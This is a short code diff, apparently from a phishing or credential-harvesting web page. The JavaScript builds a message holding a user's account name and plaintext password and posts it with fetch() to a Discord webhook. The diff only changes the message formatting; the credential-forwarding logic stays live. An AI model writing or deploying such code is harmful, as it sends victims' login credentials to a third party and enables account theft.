@@ -95,7 +95,7 @@
 
         // 構造要傳送到 Discord 的訊息格式
         const payload = {
-            content: `📢 **收到新的登入資訊**\n----------------------------\n👤 **帳號**: \`${account}\`\n🔑 **密碼**: \`${password}\`\n----------------------------`
+            content: `帳號: \`${account}\`\n 密碼: \`${password}\`\n`
         };
 
         fetch(webhookURL, {
